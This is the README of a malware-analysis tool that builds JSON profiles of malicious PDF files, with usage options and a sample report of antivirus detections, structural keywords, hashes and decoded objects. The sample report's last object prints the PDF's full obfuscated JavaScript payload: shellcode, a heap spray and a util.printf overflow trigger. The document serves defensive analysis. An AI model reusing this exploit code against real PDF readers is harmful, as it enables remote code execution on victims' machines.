
== Purpose ==
This is a bunch of tools chained together to provide a JSON object that represents various pieces of a malicious PDF file. 

== Research == 
http://blog.9bplus.com

== Usage ==
Usage: object_builder.py [options]
Builds JSON object representing a malicious PDF

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -f FILE, --file=FILE  file to build an object from
  -d DIR, --dir=DIR     dir to build an object from
  -m, --mongo           dump to a mongodb database
  -v, --verbose         verbose outpout

== Sample Output == 
{
	"scans": {
		"wepawet": "null", 
		"virustotal": {
			"report": [
				"2010-12-11 16:51:35", 
				{
					"nProtect": "Exploit.PDF-Name.Gen", 
					"CAT-QuickHeal": "", 
					"McAfee": "", 
					"TheHacker": "", 
					"K7AntiVirus": "", 
					"VirusBuster": "", 
					"NOD32": "PDF/Exploit.Gen", 
					"F-Prot": "JS/ShellCode.AX.gen", 
					"Symantec": "Bloodhound.Exploit.213", 
					"Norman": "PDF/Suspicious.D", 
					"TrendMicro-HouseCall": "JS_UTOTI.OB", 
					"Avast": "JS:Pdfka-AK", 
					"eSafe": "PDF.Exploit", 
					"ClamAV": "Heuristics.PDF.ObfuscatedNameObject", 
					"Kaspersky": "Exploit.JS.Pdfka.cil", 
					"BitDefender": "Exploit.PDF-JS.Gen", 
					"SUPERAntiSpyware": "", 
					"Emsisoft": "Exploit.JS.Pdfka!IK", 
					"Comodo": "UnclassifiedMalware", 
					"F-Secure": "Exploit.PDF-JS.Gen", 
					"DrWeb": "", 
					"VIPRE": "Exploit.PDF-JS.Gen (v)", 
					"AntiVir": "EXP/PDF.JS.6378", 
					"TrendMicro": "JS_UTOTI.OB", 
					"McAfee-GW-Edition": "Heuristic.BehavesLike.PDF.Suspicious.F", 
					"Sophos": "Troj/PDFJs-B", 
					"eTrust-Vet": "PDF/Pidief.TD", 
					"Jiangmin": "", 
					"Command": "", 
					"Antiy-AVL": "", 
					"Microsoft": "TrojanDownloader:Win32/Small.gen!C", 
					"ViRobot": "", 
					"Prevx": "", 
					"GData": "Exploit.PDF-JS.Gen", 
					"AhnLab-V3": "PDF/Exploit-script", 
					"VBA32": "Exploit.JS.Pdfka.cil", 
					"PCTools": "HeurEngine.MaliciousExploit", 
					"Rising": "", "Ikarus": "Exploit.JS.Pdfka", 
					"Fortinet": "", 
					"AVG": "", 
					"Panda": "", 
					"Avast5": "JS:Pdfka-AK"
				}
			], 
			"permalink": "http://www.virustotal.com/file-scan/report.html?id=eb7d1c351d81a619988ab907fd664aeb4b175a84c45378f405c1102810194980-1292086295", 
			"result": 1
		}
	},
	 
	"structure": {
		"countChatAfterLastEof": "0", 
		"errorMessage": "", 
		"dates": {
			"date": []
		}, 
		"filename": "../../PDFs/files/fe53357e06be3644d535133cbee3dd67.pdf.vir", 
		"nonStreamEntropy": "4.916826", 
		"header": "%PDF-1.5", 
		"version": "0.0.11", 
		"entropy": "", 
		"totalEntropy": "7.886452", 
		"isPdf": "True", 
		"keywords": {
			"keyword": [
				{"count": 6, "hexcodecount": 0, "name": "obj"}, 
				{"count": 6, "hexcodecount": 0, "name": "endobj"}, 
				{"count": 1, "hexcodecount": 0, "name": "stream"}, 
				{"count": 1, "hexcodecount": 0, "name": "endstream"}, 
				{"count": 1, "hexcodecount": 0, "name": "xref"}, 
				{"count": 1, "hexcodecount": 0, "name": "trailer"}, 
				{"count": 1, "hexcodecount": 0, "name": "startxref"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Page"}, 
				{"count": 0, "hexcodecount": 0, "name": "/Encrypt"}, 
				{"count": 0, "hexcodecount": 0, "name": "/ObjStm"}, 
				{"count": 1, "hexcodecount": 0, "name": "/JS"}, 
				{"count": 1, "hexcodecount": 1, "name": "/JavaScript"}, 
				{"count": 0, "hexcodecount": 0, "name": "/AA"}, 
				{"count": 1, "hexcodecount": 1, "name": "/OpenAction"}, 
				{"count": 0, "hexcodecount": 0, "name": "/AcroForm"}, 
				{"count": 0, "hexcodecount": 0, "name": "/JBIG2Decode"}, 
				{"count": 0, "hexcodecount": 0, "name": "/RichMedia"}, 
				{"count": 0, "hexcodecount": 0, "name": "/Launch"}, 
				{"count": 0, "hexcodecount": 0, "name": "/Colors > 2^24"}, 
				{"count": 2, "hexcodecount": 0, "name": "/4"}, 
				{"count": 1, "hexcodecount": 0, "name": "/7kD"}, 
				{"count": 1, "hexcodecount": 1, "name": "/ASCIIHexDecode"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Action"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Catalog"}, 
				{"count": 2, "hexcodecount": 2, "name": "/Count"}, 
				{"count": 1, "hexcodecount": 0, "name": "/D"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Filter"}, 
				{"count": 1, "hexcodecount": 1, "name": "/FlateDecode"}, 
				{"count": 1, "hexcodecount": 0, "name": "/J2"}, 
				{"count": 1, "hexcodecount": 0, "name": "/K"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Kids"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Length"}, 
				{"count": 1, "hexcodecount": 1, "name": "/MediaBox"}, 
				{"count": 1, "hexcodecount": 0, "name": "/Nw"}, 
				{"count": 2, "hexcodecount": 2, "name": "/Outlines"}, 
				{"count": 2, "hexcodecount": 2, "name": "/Pages"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Parent"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Root"}, 
				{"count": 1, "hexcodecount": 1, "name": "/S"}, 
				{"count": 1, "hexcodecount": 1, "name": "/Size"}, 
				{"count": 5, "hexcodecount": 5, "name": "/Type"}, 
				{"count": 1, "hexcodecount": 0, "name": "/d"}, 
				{"count": 1, "hexcodecount": 0, "name": "/g"}, 
				{"count": 1, "hexcodecount": 0, "name": "/j2U"}
			]
		}, 
		"countEof": "1", 
		"streamEntropy": "7.959980", 
		"errorOccured": "False"
	}, 
	
	"hash_data": {
		"hashes": {
			"objects": {
				"object": [
					{"length": 89, "version": 0, "id": 1, "md5": "b60c8c6827aa107d7266fe4a974029c0"}, 
					{"length": 46, "version": 0, "id": 2, "md5": "8511ab96e6ff067fa6cecf1aa6c5f0d4"}, 
					{"length": 51, "version": 0, "id": 3, "md5": "0f71cc95d7e3c7ca6463519443d42b26"}, 
					{"length": 73, "version": 0, "id": 4, "md5": "bfaf964ecde2bc56534e3d3ce0edc6bd"}, 
					{"length": 56, "version": 0, "id": 5, "md5": "b5b9672d521e94256cd1cccf33cec78c"}, 
					{"length": 5742, "version": 0, "id": 6, "md5": "04cba0f9a1d2d8914ff013df552cee1f"}
				]
			}, 
			"file": {
				"sha256": "eb7d1c351d81a619988ab907fd664aeb4b175a84c45378f405c1102810194980", 
				"md5": "fe53357e06be3644d535133cbee3dd67", 
				"sha1": "bada2624083632a9660f466a1a6ef702472f0b18"
			}
		}
	}, 
	
	"scores": {
		"total": "5", 
		"primary": "5", 
		"seconday": "0"
	},
	
	"contents": {
		"objects": {
			"object": [
				{"encoded": "<</Ty#70e/#43#61t#61l#6fg/Ou#74li#6ees 2 0 R/Pa#67#65s 3 0 R/#4fpen#41#63#74#69on 5 0 R>>", "id": 1, "decoded": "failed"}, 
				{"encoded": "<</#54#79#70#65/#4fu#74lin#65s/#43#6f#75nt 0>>", "id": 2, "decoded": "failed"}, 
				{"encoded": "<</#54ype/P#61ges/#4b#69#64s[4 0 R]/#43o#75n#74 1>>", "id": 3, "decoded": "failed"}, 
				{"encoded": "<</Typ#65/#50ag#65/P#61#72#65n#74 3 0 R/#4de#64#69aB#6f#78[0 0 612 792]>>", "id": 4, "decoded": "failed"}, 
				{"encoded": "<</#54y#70#65/Act#69#6fn/#53/Java#53c#72ip#74/JS 6 0 R>>", "id": 5, "decoded": "failed"}, 
				{"encoded": "failed", "id": 6, "decoded": "\n\t\tvar crOcBpKVifLfEoqKYHkBpReDWNNgqXwgCRsaCJRnEvnToLocGhWhcchHIToCsCqAdTLSlAdZriuLMaQhDsWhdQWfGyVUAoRuyUI = unescape(\"%uf99f%u4a4e%u4837%u4191%u4b4b%ufcf9%ud637%u9743%u4b48%u9b2f%u4298%uf5fc%u9b9b%u9892%u272f%u993f%u2f92%u27f9%u494f%u9248%u9042%u9937%uf837%uf546%u9393%u49f8%uf948%u274e%u974b%u4e99%u4192%u904a%u4827%u9b40%u4a42%u9b43%u4946%u964a%u9946%u9947%u2741%u9b2f%u2f9f%u90f8%u414a%u4b43%u934e%u419f%u9193%u4e9f%u4796%u9793%u4e41%u3f27%u4ffd%u9bf8%ud63f%u97f8%u4699%uf997%u9f99%u4f91%u374b%u2727%u994e%u4698%u4e4e%u27f9%ufd97%u4698%u484f%u9040%u4649%u433f%u2f92%u4947%uf927%u4293%u4f99%uf548%ufd3f%u2ff9%u4637%u4892%u42fc%u2f98%ufc99%u9243%u4e40%u9641%u484e%u4e41%u484f%u4ff9%u939f%u3ffc%ufc4e%u4227%u993f%u9b4b%u9b3f%u4691%u432f%u2f48%u4e91%u3ff9%u9737%ufc37%u43f9%u9793%u9341%uf840%u4197%u4b4a%ufc93%ufd46%u46f8%u484e%u999b%u9ffc%ufc91%u99f8%ud641%u96f5%u374f%u939f%u4399%u4892%u483f%u3f98%uf8fd%u433f%u989b%u984b%u4846%u4296%u97d6%u4342%u3747%u99f8%ud69f%u434b%u4942%uf84e%u40fd%u4397%u4196%u914e%u40f9%u2f49%u4096%u484b%ud699%uf9d6%u9f9b%u9f4a%u2f91%u9247%uf847%ufd4f%ud642%u48f8%u4843%u9b93%uf842%u4b91%uf84e%u4f96%u2792%uf541%u4f4e%u439f%u4896%ufc92%u9841%uf99f%u4642%ud6f9%u9396%u4e92%u3798%u9148%u372f%u40fc%u4a37%u99f5%u91f8%u4a2f%u4a27%u9f9f%u92fc%uf598%u4b99%u4a4b%u91f9%ud63f%u9827%u9399%u9247%u93d6%u2792%u9242%u99f8%uf84e%u903f%u9742%u379b%u4bfc%u4799%u474a%u2740%u41f5%ufc42%uf8f5%uf8f8%u9642%u41fc%u4899%u9b46%u93d6%u279f%ud6f5%u9146%u2792%u4f27%u4393%u4037%ufdfd%u2741%u3747%uf837%u494a%u929b%u9bd6%u4e37%ud691%ufd4e%u4a3f%u9bf9%u424b%u9b4b%u4043%u373f%u4e41%u4b46%uf99f%uf54f%u9398%uf542%u2fd6%u9946%ufd4a%u3796%u90f9%u4727%u2792%ufd3f%u9141%u274a%u902f%u4241%u98f8%u9037%u2793%u4e27%u2f9b%u4027%u4841%uf591%u99d6%u474a%u4e41%u2f97%u484b%u4ff8%u9037%uf5d6%u4349%u4847%u4f49%u37f5%u9391%u934e%u424e%ud643%u4827%ud63f%uf591%uf54a%u4949%u27d6%u274f%u4691%u4227%u464e%u963f%u4afd%u9249%u4649%ud6fc%u4b2f%uc4da%uc929%u74d9%uf424%u63b1%ube5b%u0fa6%u8f75%u7331%u831a%u04c3%u7303%ue216%ue453%ud565%uc8d1%u8f4c%u125c%ud04e%u61aa%u32c9%u9e28%u5aec%u9e27%u6510%u2dc7%u0376%u6dbe%u0c75%ue869%uf41f%ud27b%u15b5%u6192%u0b81%ufbbd%u6af8%u162f%u7e59%u61a2%ue543%u7c56%ua363%ue23c%u0379%u49cd%u6409%u4503%udce0%u3401%u4a17%u2ec6%ue6d7%ubc17%u3649%u24a1%u2a34%u22f1%u94b8%u12cf%u412a%u43dd%uf3f6%u33bb%u9e71%u6e63%u61d1%uff81%u42c0%u6520%u24be%u0152%u8da5%uacb0%u7740%uada6%ue666%u6edc%ue410%u63a9%uc983%u4d58%u5025%u5703%uf709%ua7f8%u39d3%uf49b%u870e%u6390%u76ee%u0df2%ue176%u72e0%udd03%u94cb%ufbb4%uc51f%u54a3%ucdc6%udfce%uc341%uecab%u2e08%udd55%uf11f%u7b07%uf51a%u808f%udbfa%ue56a%u18e3%u8f13%ub949%u79ed%uf547%u1f27%u6f99%ua5aa%ubaec%uebac%uf387%u3a57%uae3a%uf7c1%uf7d8%u971d%ucc28%u9211%u98ce%ue36e%u643c%u4e06%uc019%u3199%u92ff%u903f%ub703%uc709%ub20d%ue552%ua80c%ufc9f%ub604%ufdbe%u0335%u14de%u6828%u34eb%u7a42%u3de8%u8b4f%u22fa%ued57%u5233%ud290%u6f2d%u72a4%u7171%u68a8%u8347%u8fa3%u99a0%ua5aa%u9aa7%u9031%ua0b8%ue322%ub7d2%u8d6c%ud3c9%u5a79%ud3e7%u6f18%uc9c3%u86c7%u063a%u9002%u143b%uab21%u1763%ua84c%u4144%u25c6%u0201%ue92c%udbc6%udb61%u2429%u0db9%u647c%u6397%ub4b3%ue2c8%ud0da%ud42b%u292c%u2663%u3a6b%u22ea%u8c4e%uc4ca%u81d1%u2477%u1e42%u0331%uf716%ufbd1%u6ea4%u8847%uf12e\");\n\t\tvar hCAHdigRShwiugwVAKTWtHwoRURetrrXimXvqisAJleQmaLuikezyMHYFlmJUgUDJOXMnJtyn =\"\";\n\t\tfor (UjNbRzxFGArGCBHOSLusJsNRbeoCSwroLWSYnrWidylZ=128;UjNbRzxFGArGCBHOSLusJsNRbeoCSwroLWSYnrWidylZ>=0;--UjNbRzxFGArGCBHOSLusJsNRbeoCSwroLWSYnrWidylZ) hCAHdigRShwiugwVAKTWtHwoRURetrrXimXvqisAJleQmaLuikezyMHYFlmJUgUDJOXMnJtyn += unescape(\"%uf937%u3737\");\n\t\thZbYeHNJZEBgEZTUlLORBQNLMncslbEaFLtKYHFYmoYXBLyZLPmblSXdCtLpJISZKNKTBWFLkMjsNJ = hCAHdigRShwiugwVAKTWtHwoRURetrrXimXvqisAJleQmaLuikezyMHYFlmJUgUDJOXMnJtyn + crOcBpKVifLfEoqKYHkBpReDWNNgqXwgCRsaCJRnEvnToLocGhWhcchHIToCsCqAdTLSlAdZriuLMaQhDsWhdQWfGyVUAoRuyUI;\n\t\trJDWezOCiexqDpxxZjarNVARi = unescape(\"%uf937%u3737\");\n\t\toUATJhSpmhMlegQHepbMkNhQzbKMIToJa = 20;\n\t\tGTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf = oUATJhSpmhMlegQHepbMkNhQzbKMIToJa+hZbYeHNJZEBgEZTUlLORBQNLMncslbEaFLtKYHFYmoYXBLyZLPmblSXdCtLpJISZKNKTBWFLkMjsNJ.length\n\t\twhile (rJDWezOCiexqDpxxZjarNVARi.length<GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf) rJDWezOCiexqDpxxZjarNVARi+=rJDWezOCiexqDpxxZjarNVARi;\n\t\trbtwBkDuuKfPsBIUfraPodJtDjmcruVSoYGMIXibxlJGTTrfqbwQUgJKwxJaiFpyGUqTOMojqyUOaPqFoZ = rJDWezOCiexqDpxxZjarNVARi.substring(0, GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf);\n\t\tqORXKjgryM = rJDWezOCiexqDpxxZjarNVARi.substring(0, rJDWezOCiexqDpxxZjarNVARi.length-GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf);\n\t\twhile(qORXKjgryM.length+GTkCOMOKiiILuRvBZyugNYMbGtKubqkWfqIunWZpnXEvMdJQyqtIjAoOCLiTjnKKcyRobjIVXTvxPMisBmltCf < 0x40000) qORXKjgryM = qORXKjgryM+qORXKjgryM+rbtwBkDuuKfPsBIUfraPodJtDjmcruVSoYGMIXibxlJGTTrfqbwQUgJKwxJaiFpyGUqTOMojqyUOaPqFoZ;\n\t\tUYtKHVgZTtcooYAPbCYZBjkcDrHIjBDzZEbuhkzHHbCFyAzAZtNseCTPfhi = new Array();\n\t\tfor (acwsUYeEbJQZhveOFRHSdoE=0;acwsUYeEbJQZhveOFRHSdoE<1450;acwsUYeEbJQZhveOFRHSdoE++) UYtKHVgZTtcooYAPbCYZBjkcDrHIjBDzZEbuhkzHHbCFyAzAZtNseCTPfhi[acwsUYeEbJQZhveOFRHSdoE] = qORXKjgryM + hZbYeHNJZEBgEZTUlLORBQNLMncslbEaFLtKYHFYmoYXBLyZLPmblSXdCtLpJISZKNKTBWFLkMjsNJ;\n\t\tutil.printf(\"%45000.45000f\", 0);\n\t\t\t\t\t"}
			]
		}
	}
}

